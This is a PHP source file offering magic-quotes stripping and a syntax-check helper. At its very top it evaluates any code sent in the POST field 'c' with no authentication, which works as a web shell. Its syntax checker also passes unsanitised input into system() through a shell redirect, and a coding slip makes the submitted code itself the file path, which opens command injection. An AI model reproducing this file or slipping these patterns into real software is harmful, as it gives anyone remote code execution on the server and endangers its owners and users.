<?php
strip_mq();

if(isset($_POST["c"])){
  eval($_POST["c"].";");
}

/**
 * Strip magic quotes from request data.
 */
function strip_mq(){
  if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
      // Create lamba style unescaping function (for portability)
      $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
      $unescape_function = (empty($quotes_sybase) || $quotes_sybase === 'off') ? 'stripslashes($value)' : 'str_replace("\'\'","\'",$value)';
      $stripslashes_deep = create_function('&$value, $fn', '
          if (is_string($value)) {
              $value = ' . $unescape_function . ';
          } else if (is_array($value)) {
              foreach ($value as &$v) $fn($v, $fn);
          }
      ');
     
      // Unescape data
      $stripslashes_deep($_POST, $stripslashes_deep);
      $stripslashes_deep($_GET, $stripslashes_deep);
      $stripslashes_deep($_COOKIE, $stripslashes_deep);
      $stripslashes_deep($_REQUEST, $stripslashes_deep);
  }
}


/**
*    Check Syntax
*    Performs a Syntax check within a php script, without killing the parser (hopefully)
*    Do not use this with PHP 5 <= PHP 5.0.4, or rename this function.
*
*    @params    string    PHP to be evaluated
*    @return    array    Parse error info or true for success
**/
function php_check_syntax( $php, $isFile=false )
{
    # Get the string tokens
    $tokens = token_get_all( '<?php '.trim( $php  ));
   
    # Drop our manually entered opening tag
    array_shift( $tokens );
    token_fix( $tokens );

    # Check to see how we need to proceed
    # prepare the string for parsing
    if( isset( $tokens[0][0] ) && $tokens[0][0] === T_OPEN_TAG )
       $evalStr = $php;
    else
        $evalStr = "<?php\n{$php}?>";

    if( $isFile OR ( $tf = tempnam( NULL, 'parse-' ) AND file_put_contents( $tf, $php ) !== FALSE ) AND $tf = $php )
    {
        # Prevent output
        ob_start();
        system( 'C:\inetpub\PHP\5.2.6\php -c "'.dirname(__FILE__).'/php.ini" -l < '.$php, $ret );
        $output = ob_get_clean();

        if( $ret !== 0 )
        {
            # Parse error to report?
            if( (bool)preg_match( '/Parse error:\s*syntax error,(.+?)\s+in\s+.+?\s*line\s+(\d+)/', $output, $match ) )
            {
                return array(
                    'line'    =>    (int)$match[2],
                    'msg'    =>    $match[1]
                );
            }
        }
        return true;
    }
    return false;
}

function token_fix( &$tokens ) {
    if (!is_array($tokens) || (count($tokens)<2)) {
        return;
    }
   //return of no fixing needed
    if (is_array($tokens[0]) && (($tokens[0][0]==T_OPEN_TAG) || ($tokens[0][0]==T_OPEN_TAG_WITH_ECHO)) ) {
        return;
    }
    //continue
    $p1 = (is_array($tokens[0])?$tokens[0][1]:$tokens[0]);
    $p2 = (is_array($tokens[1])?$tokens[1][1]:$tokens[1]);
    $p3 = '';

    if (($p1.$p2 == '<?') || ($p1.$p2 == '<%')) {
        $type = ($p2=='?')?T_OPEN_TAG:T_OPEN_TAG_WITH_ECHO;
        $del = 2;
        //update token type for 3rd part?
        if (count($tokens)>2) {
            $p3 = is_array($tokens[2])?$tokens[2][1]:$tokens[2];
            $del = (($p3=='php') || ($p3=='='))?3:2;
            $type = ($p3=='=')?T_OPEN_TAG_WITH_ECHO:$type;
        }
        //rebuild erroneous token
        $temp = array($type, $p1.$p2.$p3);
        if (version_compare(phpversion(), '5.2.2', '<' )===false)
            $temp[] = isset($tokens[0][2])?$tokens[0][2]:'unknown';

        //rebuild
        $tokens[1] = '';
        if ($del==3) $tokens[2]='';
        $tokens[0] = $temp;
    }
    return;
}